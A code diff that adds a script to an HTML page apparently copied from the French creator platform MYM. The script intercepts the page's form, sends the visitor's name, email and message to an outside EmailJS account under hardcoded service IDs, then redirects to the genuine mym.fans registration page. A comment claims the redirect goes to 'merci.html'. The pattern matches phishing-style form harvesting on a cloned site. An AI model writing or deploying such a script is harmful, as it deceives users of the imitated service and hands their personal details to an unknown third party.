@@ -91,6 +91,36 @@
                     </form>
                 </div>
             </div>
+            <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("l7RHGlQsUzOwD6yc1"); // Remplace "YOUR_USER_ID" par ton USER_ID fourni par EmailJS
+        })();
+        
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire classique
+
+            // Collecte les données du formulaire
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+
+            // Envoi des données via EmailJS
+            emailjs.send("service_zr11u2p", "template_mkymtll", {
+                name: name,
+                email: email,
+                message: message
+            }).then(function(response) {
+                console.log("SUCCESS", response.status, response.text);
+                document.getElementById('response').style.display = 'block'; // Affiche le message de succès
+                setTimeout(function() {
+                    window.location.href = 'https://mym.fans/app/register/email'; // Redirige vers la page "merci.html" après 2 secondes
+                }, 2000);
+            }, function(error) {
+                console.log("FAILED", error);
+            });
+        });
+    </script>
         </div>
         <div data-message-toast="" data-toast_pricerequired="Tu dois renseigner un prix..." data-toast_postvideouploadprocess="Ta vidéo est en cours de traitement, elle sera disponible dans quelques minutes..." data-toast_videouploadsuccess="Ta vidéo a bien été téléchargée !" data-toast_videouploadprocess="Ton média est en cours de traitement, tu pourras valider ton post dès la fin du chargement..." data-toast_videouploadfail="Une erreur est survenue sur le téléchargement de la vidéo... Réessaie !" data-toast_clouduploadprocess="Ta vidéo est en cours de traitement. Elle sera automatiquement ajoutée à ton mym.cloud dans quelques minutes..." data-toast_mediauploaderror="Erreur lors de l'ajout de votre média, réessayez..." style="box-sizing:border-box;font-family:NouvelleGrotesk, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;"></div>
     </div>
